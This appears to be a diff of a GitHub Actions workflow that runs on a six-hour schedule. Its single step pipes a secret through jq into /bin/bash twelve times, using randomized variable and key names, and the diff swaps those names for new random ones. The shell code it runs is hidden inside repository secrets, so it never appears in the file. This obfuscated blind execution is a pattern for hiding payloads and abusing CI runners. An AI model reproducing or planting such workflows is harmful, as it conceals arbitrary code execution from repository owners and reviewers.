@@ -2,28 +2,26 @@ name: membershipthorns
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 0/6 * * *'
+    - cron: '18 4/6 * * *'
 
-jobs:  # 6772
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: membershipthorns
         env:
-          xe58: ${{ secrets.xe58 }}
+          l0025: ${{ secrets.l0025 }}
         run: |
-          echo $xe58 | jq -r .zfru37 | /bin/bash
-          echo $txtjy7974 | jq -r .zu166 | /bin/bash
-          echo $ha54 | jq -r .kmvtj12 | /bin/bash
-          echo $ctwa858 | jq -r .pvz4375 | /bin/bash
-          echo $x8 | jq -r .by7 | /bin/bash
-          echo $bea462 | jq -r .wbr7103 | /bin/bash
-          echo $mhg05947 | jq -r .xa6 | /bin/bash
-          echo $w64 | jq -r .lyeo3 | /bin/bash
-          echo $z75004 | jq -r .vc8367 | /bin/bash
-          echo $t61 | jq -r .q6 | /bin/bash
-          echo $v03873 | jq -r .kitj53199 | /bin/bash
-          echo $pjv552 | jq -r .txb039 | /bin/bash
+          echo $l0025 | jq -r .v09 | /bin/bash
+          echo $z91120 | jq -r .taj0342 | /bin/bash
+          echo $uhk6336 | jq -r .tyrny10156 | /bin/bash
+          echo $dxa579 | jq -r .tzgog02 | /bin/bash
+          echo $lg0 | jq -r .mnu9311 | /bin/bash
+          echo $itpg1 | jq -r .sfd25 | /bin/bash
+          echo $aodbb235 | jq -r .i50 | /bin/bash
+          echo $is22 | jq -r .aoc361 | /bin/bash
+          echo $slg6 | jq -r .obte08724 | /bin/bash
+          echo $jit522 | jq -r .xf101 | /bin/bash
+          echo $gxzy6406 | jq -r .k0 | /bin/bash
 
